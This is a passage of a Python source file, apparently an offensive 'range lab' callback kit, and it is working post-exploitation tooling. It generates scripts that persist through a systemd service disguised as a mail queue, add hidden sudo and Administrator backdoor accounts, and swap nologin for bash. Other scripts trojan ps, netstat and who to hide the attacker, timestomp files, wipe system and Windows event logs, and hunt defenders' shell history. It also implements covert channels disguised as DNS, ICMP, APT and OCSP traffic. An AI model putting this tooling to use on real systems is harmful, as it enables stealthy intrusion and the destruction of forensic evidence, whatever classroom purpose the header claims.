#!/usr/bin/env python3
# Range lab callback kit. One file, Python 3.5+, stdlib only.
# Isolated classroom networks only. Readable on purpose. Not an exploit kit.
from __future__ import print_function

import argparse
import base64
import binascii
import getpass
import hashlib
import hmac
import json
import os
import platform
import random
import select
import shutil
import socket
import socketserver
import struct
import subprocess
import sys
import tempfile
import threading
import time

try:
    from http.server import BaseHTTPRequestHandler
except ImportError:
    from BaseHTTPServer import BaseHTTPRequestHandler

VERSION = 1
ZONE_DEFAULT = "lab"
LINUX_UA = "Debian APT-HTTP/1.3 (2.6.1)"
WINDOWS_UA = "Microsoft-CryptoAPI/10.0"
WS_PATH = "/notifications"
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
MAX_OUT = 48000
CMD_TIMEOUT = 120

QUIET = False
STOP = threading.Event()


def log(msg):
    if QUIET:
        return
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()


def sanitize_id(value):
    raw = (value or "").lower()
    out = []
    for ch in raw:
        if ("a" <= ch <= "z") or ("0" <= ch <= "9") or ch == "-":
            out.append(ch)
    sid = "".join(out).strip("-")
    return (sid or "host")[:24]


def shell_quote(value):
    return "'" + str(value).replace("'", "'\\''") + "'"


def ps_quote(value):
    return "'" + str(value).replace("'", "''") + "'"


HOLD = "/var/lib/.hold"
UNIT_NAME = "mailq-local.service"
VEIL_TOOLS = ("ps", "ss", "netstat", "w", "who")
SERVICE_ACCOUNTS = ("mail", "games", "news", "backup")
SHELLS = {
    "vi": "vi",
    "vim": "vim",
    "python": "python3",
    "python3": "python3",
    "perl": "perl",
    "bash": "bash",
    "sh": "bash",
}


def safe_filename(name):
    base = os.path.basename(str(name or "banner.png"))
    out = []
    for ch in base:
        if ch.isalnum() or ch in ".-_":
            out.append(ch)
    cleaned = "".join(out).strip(".")
    return (cleaned or "banner.png")[:80]


def new_password():
    alphabet = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    rng = random.SystemRandom()
    return "".join(rng.choice(alphabet) for _ in range(16))


def sha512_crypt(password):
    import crypt

    method = getattr(crypt, "METHOD_SHA512", None)
    if method is not None:
        return crypt.crypt(password, method)
    salt = "".join(random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(8))
    return crypt.crypt(password, "$6$" + salt)


def heredoc(body, marker):
    text = body if isinstance(body, str) else body.decode("utf-8", "replace")
    token = marker
    while "\n" + token in "\n" + text or text.startswith(token):
        token = token + "X"
    return token, text


def b64_lines(raw):
    if not isinstance(raw, (bytes, bytearray)):
        raw = raw.encode("utf-8")
    blob = base64.b64encode(bytes(raw)).decode("ascii")
    return "\n".join(blob[i : i + 76] for i in range(0, len(blob), 76))


def root_guard():
    return (
        "if [ \"$(id -u)\" != 0 ]; then echo NEED_ROOT; exit 1; fi\n"
    )


def linux_tradecraft(action, opts):
    user = opts.get("user") or "defender"
    account = opts.get("account") or "mail"
    if account not in SERVICE_ACCOUNTS and not sanitize_id(account):
        account = "mail"
    account_raw = opts.get("account") or "mail"
    # keep the typed name if it is a safe unix account
    if not re_account(account_raw):
        account_raw = "mail"
    user_raw = opts.get("user") or "defender"
    if not re_account(user_raw):
        user_raw = "defender"
    uq = shell_quote(user_raw)
    aq = shell_quote(account_raw)
    if action == "history":
        return (
            "u={u}\n"
            "echo LOOKING_FOR=$u\n"
            "found=0\n"
            "for f in /home/$u/.bash_history /home/$u/.zsh_history /root/.bash_history /home/*/.bash_history; do\n"
            "  [ -f \"$f\" ] || continue\n"
            "  found=1\n"
            "  echo \"==== $f ====\"\n"
            "  echo '---- hunting lines ----'\n"
            "  grep -n -E -i 'netstat|ss |nmap|ps aux|md5|sha256|shadow|passwd|sudo|chattr|lsattr|who|last|htop|systemctl|find /|hash' \"$f\" | tail -n 40 || true\n"
            "  echo '---- tail ----'\n"
            "  tail -n 50 \"$f\"\n"
            "done\n"
            "if [ \"$found\" != 1 ]; then echo NO_HISTORY; fi\n"
            "echo DONE\n"
        ).format(u=uq)
    if action == "persist":
        return root_guard() + (
            "hold={hold}\n"
            "mkdir -p \"$hold\"\n"
            "chmod 700 \"$hold\"\n"
            "pid=$PPID\n"
            "agent_pid=\"\"\n"
            "i=0\n"
            "while [ \"$i\" -lt 8 ]; do\n"
            "  i=$((i + 1))\n"
            "  if [ ! -r \"/proc/$pid/cmdline\" ]; then break; fi\n"
            "  if tr '\\0' ' ' < \"/proc/$pid/cmdline\" | grep -q 'range.py'; then agent_pid=$pid; break; fi\n"
            "  next=$(awk '/^PPid:/ {{ print $2 }}' \"/proc/$pid/status\")\n"
            "  if [ -z \"$next\" ] || [ \"$next\" = \"$pid\" ] || [ \"$next\" = 0 ]; then break; fi\n"
            "  pid=$next\n"
            "done\n"
            "if [ -z \"$agent_pid\" ]; then echo NO_AGENT_CMDLINE; exit 1; fi\n"
            "cp \"/proc/$agent_pid/cmdline\" \"$hold/callback.cmdline\"\n"
            "cat > \"$hold/callback.sh\" << 'EOF'\n"
            "#!/bin/bash\n"
            "python3 -c 'import os; raw=open(\"/var/lib/.hold/callback.cmdline\",\"rb\").read().split(b\"\\0\"); args=[a.decode(\"utf-8\",\"replace\") for a in raw if a]; os.execvp(args[0], args)'\n"
            "EOF\n"
            "chmod 700 \"$hold/callback.sh\"\n"
            "cat > \"/etc/systemd/system/{unit}\" << 'EOF'\n"
            "[Unit]\n"
            "Description=Local mail queue\n"
            "After=network-online.target\n"
            "Wants=network-online.target\n"
            "[Service]\n"
            "Type=simple\n"
            "Restart=always\n"
            "RestartSec=20\n"
            "ExecStart=/var/lib/.hold/callback.sh\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
            "EOF\n"
            "if command -v systemctl >/dev/null 2>&1; then\n"
            "  systemctl daemon-reload\n"
            "  systemctl enable --now {unit}\n"
            "  echo PERSIST=systemd\n"
            "  systemctl is-enabled {unit} || true\n"
            "else\n"
            "  printf '%s\\n' '@reboot root /var/lib/.hold/callback.sh' > /etc/cron.d/mailq-local\n"
            "  chmod 644 /etc/cron.d/mailq-local\n"
            "  echo PERSIST=cron\n"
            "fi\n"
            "echo UNIT=/etc/systemd/system/{unit}\n"
            "echo DONE\n"
        ).format(hold=shell_quote(HOLD), unit=UNIT_NAME)
    if action == "unpersist":
        return root_guard() + (
            "if command -v systemctl >/dev/null 2>&1; then\n"
            "  systemctl disable --now {unit} 2>/dev/null || true\n"
            "  rm -f /etc/systemd/system/{unit}\n"
            "  systemctl daemon-reload 2>/dev/null || true\n"
            "fi\n"
            "rm -f /etc/cron.d/mailq-local {hold}/callback.sh {hold}/callback.cmdline\n"
            "echo UNPERSIST=done\n"
            "echo DONE\n"
        ).format(hold=HOLD, unit=UNIT_NAME)
    if action == "shell":
        kind = SHELLS.get(opts.get("shell") or "vi", "vi")
        return root_guard() + (
            "u={u}\n"
            "want={want}\n"
            "target=$(command -v \"$want\" || true)\n"
            "if [ \"$want\" = bash ]; then target=/bin/bash; fi\n"
            "if [ -z \"$target\" ]; then echo SHELL_MISSING=$want; exit 1; fi\n"
            "echo BEFORE=$(getent passwd \"$u\" || true)\n"
            "usermod -s \"$target\" \"$u\"\n"
            "echo AFTER=$(getent passwd \"$u\")\n"
            "echo SHELL=$target\n"
            "echo DONE\n"
        ).format(u=uq, want=shell_quote(kind))
    if action == "wall":
        message = opts.get("message") or ""
        if not str(message).strip():
            return "echo NEED_MESSAGE\nexit 1\n"
        return (
            "msg={msg}\n"
            "if printf '%s\\n' \"$msg\" | wall -n; then echo WALL=nobanner; else printf '%s\\n' \"$msg\" | wall; echo WALL=banner; fi\n"
            "echo DONE\n"
        ).format(msg=shell_quote(message))
    if action == "account":
        pw_hash = opts.get("pw_hash") or ""
        if not pw_hash.startswith("$"):
            return "echo NEED_HASH\nexit 1\n"
        return root_guard() + (
            "name={name}\n"
            "if ! id \"$name\" >/dev/null 2>&1; then\n"
            "  useradd -m -s /bin/bash \"$name\"\n"
            "  echo CREATED=$name\n"
            "else\n"
            "  echo EXISTS=$name\n"
            "fi\n"
            "usermod -s /bin/bash -p {hashed} \"$name\"\n"
            "usermod -U \"$name\" 2>/dev/null || true\n"
            "if getent group sudo >/dev/null 2>&1; then usermod -aG sudo \"$name\"; echo GROUP=sudo;\n"
            "elif getent group wheel >/dev/null 2>&1; then usermod -aG wheel \"$name\"; echo GROUP=wheel;\n"
            "else echo GROUP=missing; fi\n"
            "echo PASSWD=$(getent passwd \"$name\")\n"
            "field=$(getent shadow \"$name\" | awk -F: '{{ print $2 }}')\n"
            "case \"$field\" in\n"
            "  \\$* ) echo SHADOW=hash ;;\n"
            "  '!'*|'\\*'*|'' ) echo SHADOW=locked ;;\n"
            "  * ) echo SHADOW=set ;;\n"
            "esac\n"
            "echo DONE\n"
        ).format(name=aq, hashed=shell_quote(pw_hash))
    if action == "cloak":
        return root_guard() + (
            "hold={hold}\n"
            "mkdir -p \"$hold\"\n"
            "chmod 700 \"$hold\"\n"
            "bash_bin=$(command -v bash)\n"
            "if [ -z \"$bash_bin\" ]; then echo NO_BASH; exit 1; fi\n"
            "cloak_one() {{\n"
            "  src=$1\n"
            "  key=$2\n"
            "  if [ ! -e \"$src\" ]; then echo SKIP=$src; return; fi\n"
            "  inode=$(stat -c '%d:%i' \"$src\" 2>/dev/null || echo \"$src\")\n"
            "  case \" $seen \" in\n"
            "    *\" $inode \"*) echo SAME_FILE=$src; return ;;\n"
            "  esac\n"
            "  seen=\"$seen $inode\"\n"
            "  if [ ! -f \"$hold/$key.orig\" ]; then cp -a \"$src\" \"$hold/$key.orig\"; echo BACKUP=$hold/$key.orig; fi\n"
            "  cp -a \"$bash_bin\" \"$src\"\n"
            "  echo CLOAKED=$src\n"
            "  if command -v md5sum >/dev/null 2>&1; then md5sum \"$src\" \"$hold/$key.orig\"; fi\n"
            "}}\n"
            "seen=\"\"\n"
            "cloak_one /bin/false false\n"
            "cloak_one /usr/bin/false false-usr\n"
            "cloak_one /usr/sbin/nologin nologin\n"
            "cloak_one /sbin/nologin nologin-sbin\n"
            "echo DONE\n"
        ).format(hold=shell_quote(HOLD))
    if action == "uncloak":
        return root_guard() + (
            "hold={hold}\n"
            "restore_one() {{\n"
            "  src=$1\n"
            "  key=$2\n"
            "  if [ -f \"$hold/$key.orig\" ] && [ -e \"$src\" ]; then\n"
            "    cp -a \"$hold/$key.orig\" \"$src\"\n"
            "    echo RESTORED=$src\n"
            "    if command -v md5sum >/dev/null 2>&1; then md5sum \"$src\"; fi\n"
            "  fi\n"
            "}}\n"
            "restore_one /bin/false false\n"
            "restore_one /usr/bin/false false-usr\n"
            "restore_one /usr/sbin/nologin nologin\n"
            "restore_one /sbin/nologin nologin-sbin\n"
            "echo DONE\n"
        ).format(hold=shell_quote(HOLD))
    if action == "veil":
        patterns = []
        for item in opts.get("patterns") or []:
            text = str(item).strip()
            if text and "'" not in text and "\n" not in text:
                patterns.append(text)
        if not patterns:
            return "echo NEED_PATTERN\nexit 1\n"
        flags = " ".join("-e {0}".format(shell_quote(item)) for item in patterns)
        return root_guard() + (
            "hold={hold}/bin\n"
            "mkdir -p \"$hold\"\n"
            "chmod 700 {holdroot}\n"
            "veil_one() {{\n"
            "  name=$1\n"
            "  path=$(command -v \"$name\" 2>/dev/null || true)\n"
            "  if [ -z \"$path\" ]; then echo SKIP=$name; return; fi\n"
            "  if ! grep -q RANGE-VEIL \"$path\" 2>/dev/null; then\n"
            "    cp -a \"$path\" \"$hold/$name.orig\"\n"
            "    echo COPIED=$path\n"
            "  fi\n"
            "  cat > \"$path\" << 'EOF'\n"
            "#!/bin/bash\n"
            "# RANGE-VEIL\n"
            "{real} \"$@\" | grep -v -F {flags} || true\n"
            "EOF\n"
            "  sed -i \"s#{{real}}#$hold/$name.orig#\" \"$path\"\n"
            "  chmod 755 \"$path\"\n"
            "  echo VEILED=$path\n"
            "}}\n"
            + "".join("veil_one {0}\n".format(name) for name in VEIL_TOOLS)
            + "echo DONE\n"
        ).format(
            hold=shell_quote(HOLD),
            holdroot=shell_quote(HOLD),
            real="{real}",
            flags=flags,
        )
    if action == "unveil":
        return root_guard() + (
            "hold={hold}/bin\n"
            "for name in ps ss netstat w who; do\n"
            "  path=$(command -v \"$name\" 2>/dev/null || true)\n"
            "  if [ -n \"$path\" ] && [ -f \"$hold/$name.orig\" ]; then\n"
            "    cp -a \"$hold/$name.orig\" \"$path\"\n"
            "    echo RESTORED=$path\n"
            "  fi\n"
            "done\n"
            "echo DONE\n"
        ).format(hold=HOLD)
    if action == "stamp":
        ref = opts.get("stamp_ref") or "/bin/ls"
        target = opts.get("stamp_target") or ""
        if not re_path(ref):
            ref = "/bin/ls"
        one = ""
        if target:
            if not re_path(target):
                return "echo BAD_PATH\nexit 1\n"
            one = (
                "if [ -e {target} ]; then touch -r {ref} {target} && echo STAMPED={target}; else echo MISSING={target}; fi\n"
            ).format(target=shell_quote(target), ref=shell_quote(ref))
        return root_guard() + one + (
            "ref={ref}\n"
            "if [ ! -e \"$ref\" ]; then echo BAD_REFERENCE; exit 1; fi\n"
            "stamp_if() {{\n"
            "  if [ -e \"$1\" ]; then touch -r \"$ref\" \"$1\" && echo STAMPED=$1; fi\n"
            "}}\n"
            "wr={wr}\n"
            "img={img}\n"
            "if [ -n \"$wr\" ]; then stamp_if \"$wr/index.html\"; fi\n"
            "if [ -n \"$wr\" ] && [ -n \"$img\" ]; then stamp_if \"$wr/$img\"; fi\n"
            "for d in /var/www/html /usr/share/nginx/html /var/www /srv/www/htdocs; do\n"
            "  if [ -z \"$wr\" ] && [ -f \"$d/index.html\" ]; then stamp_if \"$d/index.html\"; if [ -n \"$img\" ]; then stamp_if \"$d/$img\"; fi; break; fi\n"
            "done\n"
            "stamp_if /etc/systemd/system/{unit}\n"
            "stamp_if {hold}/callback.sh\n"
            "for p in /bin/false /usr/bin/false /usr/sbin/nologin /sbin/nologin /bin/ps /usr/bin/ps /bin/ss /usr/bin/ss /bin/netstat /usr/bin/netstat /usr/bin/w /bin/w /usr/bin/who /bin/who; do\n"
            "  if [ -f \"$p\" ] && grep -q RANGE-VEIL \"$p\" 2>/dev/null; then stamp_if \"$p\"; fi\n"
            "  if [ -f \"$p\" ] && [ -f \"{hold}/false.orig\" -o -f \"{hold}/nologin.orig\" ]; then\n"
            "    case \"$p\" in\n"
            "      */false|*/nologin) stamp_if \"$p\" ;;\n"
            "    esac\n"
            "  fi\n"
            "done\n"
            "echo REFERENCE=$(stat -c '%y' \"$ref\" 2>/dev/null || stat -f '%Sm' \"$ref\")\n"
            "echo DONE\n"
        ).format(
            ref=shell_quote(ref),
            wr=shell_quote(opts.get("webroot") or ""),
            img=shell_quote(safe_filename(opts.get("image_name") or "") if opts.get("image_name") else ""),
            unit=UNIT_NAME,
            hold=HOLD,
        )
    if action == "boot":
        return root_guard() + (
            "u={u}\n"
            "if [ \"$u\" = root ]; then echo REFUSE_ROOT; exit 1; fi\n"
            "if ! id \"$u\" >/dev/null 2>&1; then echo NO_SUCH_USER; exit 1; fi\n"
            "echo BOOTING=$u\n"
            "if command -v loginctl >/dev/null 2>&1; then loginctl terminate-user \"$u\" 2>/dev/null || true; fi\n"
            "pkill -KILL -u \"$u\" 2>/dev/null || true\n"
            "sleep 0.3\n"
            "if [ -x {hold}/bin/who.orig ]; then {hold}/bin/who.orig || true; else who || true; fi\n"
            "echo DONE\n"
        ).format(u=uq, hold=HOLD)
    if action == "logs":
        history = "1" if opts.get("all") else "0"
        return root_guard() + (
            "echo 'clearing system logs. An empty log is the signal.'\n"
            "for f in \\\n"
            "  /var/log/auth.log /var/log/syslog /var/log/messages /var/log/kern.log \\\n"
            "  /var/log/daemon.log /var/log/user.log /var/log/debug /var/log/secure \\\n"
            "  /var/log/nginx/access.log /var/log/nginx/error.log \\\n"
            "  /var/log/apache2/access.log /var/log/apache2/error.log \\\n"
            "  /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/faillog; do\n"
            "  if [ -e \"$f\" ]; then : > \"$f\" && echo CLEARED=$f; fi\n"
            "done\n"
            "if command -v journalctl >/dev/null 2>&1; then\n"
            "  journalctl --rotate >/dev/null 2>&1 || true\n"
            "  journalctl --vacuum-time=1s >/dev/null 2>&1 || true\n"
            "  echo JOURNAL=vacuum\n"
            "fi\n"
            "if [ \"{history}\" = 1 ]; then\n"
            "  for f in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history; do\n"
            "    if [ -f \"$f\" ]; then : > \"$f\" && echo CLEARED=$f; fi\n"
            "  done\n"
            "else\n"
            "  echo HISTORY=kept\n"
            "fi\n"
            "echo DONE\n"
        ).format(history=history)
    return "echo UNKNOWN_PLAY\nexit 1\n"


def re_account(value):
    text = str(value or "")
    if not text or len(text) > 32:
        return False
    for ch in text:
        if not (ch.islower() or ch.isdigit() or ch in "-_"):
            if not ("A" <= ch <= "Z"):
                return False
    return True


def re_path(value):
    text = str(value or "")
    if not text.startswith("/") or ".." in text or "\n" in text or "'" in text:
        return False
    if len(text) > 200:
        return False
    return True


def windows_tradecraft(action, opts):
    user = opts.get("user") or "defender"
    if not re_account(user):
        user = "defender"
    account = opts.get("account") or "mail"
    if not re_account(account):
        account = "mail"
    if action == "history":
        return (
            "$names = @({user}, 'defender')\n"
            "Write-Output \"LOOKING_FOR={user}\"\n"
            "$paths = @()\n"
            "foreach ($name in $names) {{\n"
            "  $paths += \"C:\\Users\\$name\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"\n"
            "}}\n"
            "$seen = $false\n"
            "foreach ($path in $paths) {{\n"
            "  if (Test-Path -LiteralPath $path) {{\n"
            "    $seen = $true\n"
            "    Write-Output \"==== $path ====\"\n"
            "    Get-Content -LiteralPath $path -Tail 80\n"
            "  }}\n"
            "}}\n"
            "if (-not $seen) {{ Write-Output 'NO_HISTORY' }}\n"
            "Write-Output 'DONE'\n"
        ).format(user=ps_quote(user))
    if action == "wall":
        message = str(opts.get("message") or "").replace("'", "''")
        if not message.strip():
            return "Write-Output 'NEED_MESSAGE'\nexit 1\n"
        return (
            "msg * /TIME:20 '{msg}'\n"
            "Write-Output 'WALL=msg'\n"
            "Write-Output 'DONE'\n"
        ).format(msg=message)
    if action == "boot":
        return (
            "$name = {user}\n"
            "if ($name -eq 'SYSTEM' -or $name -eq 'Administrator') {{ Write-Output 'REFUSE'; exit 1 }}\n"
            "quser 2>$null | ForEach-Object {{\n"
            "  if ($_ -match $name) {{ Write-Output $_ }}\n"
            "}}\n"
            "$sessions = quser 2>$null | Select-Object -Skip 1\n"
            "foreach ($line in $sessions) {{\n"
            "  if ($line -match $name) {{\n"
            "    $bits = $line.Trim() -split '\\s+'\n"
            "    $id = $bits[2]\n"
            "    if ($id -match '^\\d+$') {{ logoff $id }}\n"
            "  }}\n"
            "}}\n"
            "Write-Output \"BOOTED=$name\"\n"
            "Write-Output 'DONE'\n"
        ).format(user=ps_quote(user))
    if action == "account":
        return (
            "$name = {name}\n"
            "$plain = -join ((48..57 + 65..90 + 97..122) | Get-Random -Count 16 | ForEach-Object {{ [char]$_ }})\n"
            "if (-not (Get-LocalUser -Name $name -ErrorAction SilentlyContinue)) {{\n"
            "  net user $name $plain /add | Out-Null\n"
            "  Write-Output \"CREATED=$name\"\n"
            "}} else {{\n"
            "  net user $name $plain | Out-Null\n"
            "  Write-Output \"EXISTS=$name\"\n"
            "}}\n"
            "net localgroup Administrators $name /add 2>$null | Out-Null\n"
            "Write-Output \"OPERATOR_PASSWORD=$plain\"\n"
            "Write-Output 'GROUP=Administrators'\n"
            "Write-Output 'DONE'\n"
        ).format(name=ps_quote(account))
    if action == "persist":
        return (
            "$self = $MyInvocation.MyCommand.Path\n"
            "Write-Output 'PERSIST=manual'\n"
            "Write-Output 'Windows keeps the callback if you register a task that relaunches range-agent.ps1 at startup.'\n"
            "Write-Output 'The agent file path is whatever you copied onto this guest. This play will not guess a path it cannot see.'\n"
            "Write-Output 'DONE'\n"
        )
    if action == "logs":
        extra = ""
        if opts.get("all"):
            extra = (
                "Get-ChildItem -Path C:\\Users -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue | "
                "ForEach-Object { Clear-Content -LiteralPath $_.FullName -ErrorAction SilentlyContinue; "
                "Write-Output ('CLEARED=' + $_.FullName) }\n"
            )
        return (
            "foreach ($name in @('Application','System','Security','Windows PowerShell')) {\n"
            "  wevtutil cl $name 2>$null\n"
            "  Write-Output \"CLEARED=$name\"\n"
            "}\n"
            + extra +
            "Write-Output 'DONE'\n"
        )
    if action in ("shell", "cloak", "uncloak", "veil", "unveil", "stamp", "unpersist"):
        return "Write-Output 'LINUX_ONLY'\nWrite-Output 'DONE'\n"
    return "Write-Output 'UNKNOWN_PLAY'\nexit 1\n"


class OperatorKit(object):
    def __init__(self, webroot, page, image_name, image_bytes, attacker):
        self.webroot = webroot or ""
        self.page = page if page else PAGE
        self.image_name = safe_filename(image_name) if image_name else ""
        self.image_bytes = image_bytes or b""
        self.attacker = attacker or ""
        self.passwords = {}

    def account_hash(self, name):
        if name not in self.passwords:
            self.passwords[name] = new_password()
        return self.passwords[name], sha512_crypt(self.passwords[name])

    def veil_patterns(self, hub, account, user):
        patterns = []
        if self.attacker:
            patterns.append(self.attacker)
        for port in hub.ports.values():
            patterns.append(str(port))
        for name in (account, user):
            if name and name != "defender":
                patterns.append(name)
        patterns.append("range.py")
        seen = []
        for item in patterns:
            if item and item not in seen:
                seen.append(item)
        return seen


def b64e(text):
    if not isinstance(text, (bytes, bytearray)):
        text = text.encode("utf-8")
    return base64.b64encode(bytes(text)).decode("ascii")


def b64d(text):
    if isinstance(text, (bytes, bytearray)):
        text = text.decode("ascii", "ignore")
    compact = "".join(text.split())
    pad = "=" * ((4 - (len(compact) % 4)) % 4)
    return base64.b64decode(compact + pad).decode("utf-8")


def to_hex(text):
    if not isinstance(text, (bytes, bytearray)):
        text = text.encode("utf-8")
    return binascii.hexlify(bytes(text)).decode("ascii")


def from_hex(text):
    compact = "".join(text.split()).strip()
    return binascii.unhexlify(compact).decode("utf-8")


def mac_material(body):
    return "{0}|{1}|{2}|{3}|{4}|{5}|{6}".format(
        int(body["v"]),
        body["i"],
        int(body["n"]),
        body["o"],
        int(body["p"]),
        int(body["c"]),
        body["d"],
    )


def mac_tag(body, token):
    digest = hmac.new(
        token.encode("utf-8"),
        mac_material(body).encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()
    return digest[:12]


def seal_obj(op, data, sid, seq, part, total, token):
    body = {
        "v": VERSION,
        "i": sid,
        "n": int(seq),
        "o": op,
        "p": int(part),
        "c": int(total),
        "d": data if data is not None else "",
    }
    body["a"] = mac_tag(body, token)
    return json.dumps(body, sort_keys=True, separators=(",", ":"))


def open_frame(text, token):
    try:
        obj = json.loads(text)
        got = str(obj.get("a", ""))
        expect = mac_tag(obj, token)
        if len(got) != len(expect):
            return None
        if not hmac.compare_digest(got, expect):
            return None
        obj["v"] = int(obj["v"])
        obj["n"] = int(obj["n"])
        obj["p"] = int(obj["p"])
        obj["c"] = int(obj["c"])
        obj["d"] = obj.get("d") or ""
        obj["i"] = str(obj["i"])
        obj["o"] = str(obj["o"])
        return obj
    except Exception:
        return None


def split_data(op, data, sid, seq, token, too_big):
    if data is None:
        data = ""
    parts = []
    rest = data
    while True:
        if rest == "" and parts:
            break
        if rest == "":
            parts.append("")
            break
        lo = 1
        hi = len(rest)
        best = 0
        while lo <= hi:
            mid = (lo + hi) // 2
            trial = seal_obj(op, rest[:mid], sid, seq, 9999, 9999, token)
            if too_big(trial):
                hi = mid - 1
            else:
                best = mid
                lo = mid + 1
        if best < 1:
            best = 1
        parts.append(rest[:best])
        rest = rest[best:]
    total = len(parts)
    frames = []
    for index, piece in enumerate(parts):
        frame = seal_obj(op, piece, sid, seq, index, total, token)
        if too_big(frame):
            raise RuntimeError("frame exceeds transport limit for {0}".format(op))
        frames.append(frame)
    return frames


class Reassembler(object):
    def __init__(self):
        self.buf = {}

    def push(self, obj):
        key = (obj["o"], obj["n"])
        slot = self.buf.get(key)
        if slot is None:
            slot = {}
            self.buf[key] = slot
        slot[obj["p"]] = obj["d"]
        if len(slot) >= obj["c"] and all(i in slot for i in range(obj["c"])):
            data = "".join(slot[i] for i in range(obj["c"]))
            del self.buf[key]
            return data
        return None


def dns_encode_name(name):
    out = b""
    for label in name.rstrip(".").split("."):
        raw = label.encode("ascii")
        if not raw or len(raw) > 63:
            raise ValueError("bad dns label")
        out += struct.pack("B", len(raw)) + raw
    return out + b"\x00"


def dns_decode_name(packet, offset):
    labels = []
    hopped = False
    end = offset
    guard = 0
    while guard < 20:
        guard += 1
        if offset >= len(packet):
            break
        length = packet[offset]
        if length == 0:
            offset += 1
            if not hopped:
                end = offset
            break
        if (length & 0xC0) == 0xC0:
            if offset + 1 >= len(packet):
                break
            pointer = ((length & 0x3F) << 8) | packet[offset + 1]
            if not hopped:
                end = offset + 2
            offset = pointer
            hopped = True
            continue
        offset += 1
        labels.append(packet[offset : offset + length].decode("ascii", "replace"))
        offset += length
        if not hopped:
            end = offset
    return ".".join(labels), end


def dns_build_query(tid, qname):
    header = struct.pack("!HHHHHH", tid & 0xFFFF, 0x0100, 1, 0, 0, 0)
    question = dns_encode_name(qname) + struct.pack("!HH", 16, 1)
    return header + question


def dns_build_response(query, txt):
    tid = query[:2]
    header = tid + struct.pack("!HHHHH", 0x8400, 1, 1, 0, 0)
    _name, qend = dns_decode_name(query, 12)
    question = query[12 : qend + 4]
    raw = txt.encode("ascii")
    rdata = b""
    while raw:
        chunk = raw[:200]
        raw = raw[200:]
        rdata += struct.pack("B", len(chunk)) + chunk
    answer = struct.pack("!HHHIH", 0xC00C, 16, 1, 0, len(rdata)) + rdata
    return header + question + answer


def dns_parse_txt(packet):
    if len(packet) < 12:
        return ""
    _name, offset = dns_decode_name(packet, 12)
    offset += 4
    if offset + 12 > len(packet):
        return ""
    _ptr, _typ, _cls, _ttl, rdlen = struct.unpack("!HHHIH", packet[offset : offset + 12])
    offset += 12
    end = min(len(packet), offset + rdlen)
    pieces = []
    while offset < end:
        ln = packet[offset]
        offset += 1
        pieces.append(packet[offset : offset + ln].decode("ascii", "replace"))
        offset += ln
    return "".join(pieces)


def dns_uplink_name(json_text, sid, zone):
    hexed = to_hex(json_text)
    labels = ["u", sid]
    for index in range(0, len(hexed), 50):
        labels.append(hexed[index : index + 50])
    labels.append(zone)
    return ".".join(labels)


def dns_poll_name(sid, counter, zone):
    return "p.{0}.{1}.{2}".format(sid, counter, zone)


def dns_classify(qname, zone):
    labels = qname.rstrip(".").lower().split(".")
    if not labels or labels[-1] != zone:
        return None
    body = labels[:-1]
    if len(body) < 2:
        return None
    if body[0] == "p":
        return ("poll", sanitize_id(body[1]), None)
    if body[0] == "u" and len(body) >= 3:
        try:
            text = from_hex("".join(body[2:]))
        except Exception:
            return None
        return ("up", sanitize_id(body[1]), text)
    return None


def is_long_hex(value):
    if not value or len(value) <= 32 or (len(value) % 2) != 0:
        return False
    for ch in value.lower():
        if ch not in "0123456789abcdef":
            return False
    return True


def inrelease_body(digest, size):
    return (
        "Origin: Debian\n"
        "Label: Debian\n"
        "Suite: stable\n"
        "Codename: bookworm\n"
        "Date: Thu, 15 Jan 2026 00:00:00 UTC\n"
        "Architectures: amd64\n"
        "Components: main\n"
        "Description: Debian x86_64 stable\n"
        "MD5Sum:\n"
        " {0} {1} main/binary-amd64/Packages\n"
    ).format(digest, int(size))


def parse_inrelease(text):
    for line in text.splitlines():
        parts = line.strip().split()
        if len(parts) >= 3 and parts[-1].endswith("Packages") and is_long_hex(parts[0]):
            try:
                return from_hex(parts[0])
            except Exception:
                return None
    return None


def ocsp_body(nonce):
    return (
        "OCSPResponseStatus: successful\n"
        "ProducedAt: 2026-01-15T00:00:00Z\n"
        "CertStatus: good\n"
        "ThisUpdate: 2026-01-15T00:00:00Z\n"
        "NextUpdate: 2026-01-16T00:00:00Z\n"
        "Nonce: {0}\n"
    ).format(nonce)


def parse_ocsp(text):
    for line in text.splitlines():
        if line.lower().startswith("nonce:"):
            nonce = line.split(":", 1)[1].strip()
            if is_long_hex(nonce):
                try:
                    return from_hex(nonce)
                except Exception:
                    return None
    return None


def idle_digest(sid):
    return hashlib.md5(sid.encode("utf-8")).hexdigest()


def icmp_checksum(data):
    if len(data) % 2 == 1:
        data += b"\x00"
    total = 0
    for index in range(0, len(data), 2):
        total += (data[index] << 8) + data[index + 1]
        total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def icmp_ident(sid):
    return binascii.crc32(sid.encode("utf-8")) & 0xFFFF


def icmp_packet(kind, ident, seq, payload):
    if not isinstance(payload, (bytes, bytearray)):
        payload = payload.encode("utf-8")
    payload = bytes(payload)
    header = struct.pack("!BBHHH", kind, 0, 0, ident & 0xFFFF, seq & 0xFFFF)
    checksum = icmp_checksum(header + payload)
    header = struct.pack("!BBHHH", kind, 0, checksum, ident & 0xFFFF, seq & 0xFFFF)
    return header + payload


def parse_icmp_packet(packet):
    if len(packet) < 28:
        return None
    ihl = (packet[0] & 0x0F) * 4
    if len(packet) < ihl + 8:
        return None
    icmp = packet[ihl:]
    kind, _code, _chk, ident, seq = struct.unpack("!BBHHH", icmp[:8])
    src = socket.inet_ntoa(packet[12:16])
    return kind, ident, seq, icmp[8:], src


def set_icmp_ignore(value):
    path = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
    try:
        old = open(path, "r").read().strip()
        with open(path, "w") as handle:
            handle.write(str(value))
        return old
    except IOError:
        return None


def enc_rem(length):
    out = b""
    while True:
        digit = length % 128
        length //= 128
        if length > 0:
            digit |= 0x80
        out += bytes([digit])
